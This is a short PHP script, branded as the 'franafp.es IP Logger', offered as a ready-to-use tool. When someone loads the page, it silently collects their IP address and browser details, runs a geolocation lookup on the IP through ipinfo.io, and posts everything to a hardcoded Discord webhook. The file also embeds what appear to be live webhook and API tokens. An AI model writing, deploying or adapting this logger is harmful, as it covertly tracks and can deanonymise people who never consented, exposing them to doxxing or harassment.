<?php

$ip = $_SERVER['REMOTE_ADDR']; # 
$browser = $_SERVER['HTTP_USER_AGENT'];
$url = "https://discordapp.com/api/webhooks/1058378486106038323/rqZ9LcWjM2tPmcPM2UpUXy5LVYbp0hxmR5vmqQ_O7EcMHlL6fr1Dm0Pgpu_DvzFDfpmF"; # Put your Webhook URL here


$ipinfo = file_get_contents("https://ipinfo.io/${ip}?token=6d2a4b25add82e");

$hookObject = json_encode([
    "username" => "franafp.es | IP Logger ",
    "avatar_url" => "https://franafp.es/media/kheis.png",
    "tts" => false,
    "embeds" => [
        [
            "title" => "franafp.es IP LOGGER",
            "type" => "rich",
            "description" => "You can see more information about the grabber in my [Github](https://franafp.es/github)",
            "timestamp" => "1810-01-10T19:12:00-05:00",
            "color" => hexdec( "7800b0" ),
            "footer" => [
                "text" => "IP Logger fran_afp_#0001 ",
                "icon_url" => "https://franafp.es/media/kheis.png"
            ],
            "author" => [
                "name" => "franafp.es",
                "icon_url" => "https://franafp.es/media/kheis.png"
             ],

            "fields" => [
                [
                    "name" => "IP",
                    "value" => "```{$ip}```",
                    "inline" => false
                ],
                [
                    "name" => "Browser",
                    "value" => "```{$browser}```",
                    "inline" => false
                ],
                [
                    "name" => "IP Lookup",
                    "value" => "```{$ipinfo}```",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

# Developed by fran_afp_#0001
?>
